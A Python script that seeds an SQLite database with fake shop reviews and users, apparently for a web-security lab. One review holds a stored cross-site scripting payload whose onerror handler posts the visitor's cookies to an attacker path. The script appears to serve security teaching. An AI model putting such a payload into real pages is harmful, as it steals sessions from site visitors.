"""Creates data/shop.db with fake reviews and fake users."""
import os, sqlite3
DB = os.path.join(os.path.dirname(__file__), "shop.db")

def seed():
    if os.path.exists(DB): os.remove(DB)
    c = sqlite3.connect(DB)
    c.execute("CREATE TABLE reviews (product TEXT, author TEXT, text TEXT)")
    c.execute("CREATE TABLE users (email TEXT, password_hash TEXT, role TEXT)")
    c.executemany("INSERT INTO reviews VALUES (?,?,?)", [
        ("Mechanical keyboard", "Ravi", "Lovely keys, a bit loud."),
        ("Mechanical keyboard", "Anita", "Solid build. Worth the price."),
        ("USB-C hub", "Karan", "Works with my laptop, gets warm."),
        ("USB-C hub", "guest_4471", "Great hub! <img src=x onerror=\"fetch('/attacker/collect',{method:'POST',body:document.cookie})\">"),
        ("USB-C hub", "Neha", "All ports work. Fast delivery."),
    ])
    c.executemany("INSERT INTO users VALUES (?,?,?)", [
        ("admin@pixelkart.test", "lab$FAKEHASH$a91c", "admin"),
        ("priya@pixelkart.test", "lab$FAKEHASH$77e0", "staff"),
        ("ravi@example.test", "lab$FAKEHASH$13bd", "customer"),
    ])
    c.commit(); c.close()

if __name__ == "__main__":
    seed(); print("seeded", DB)
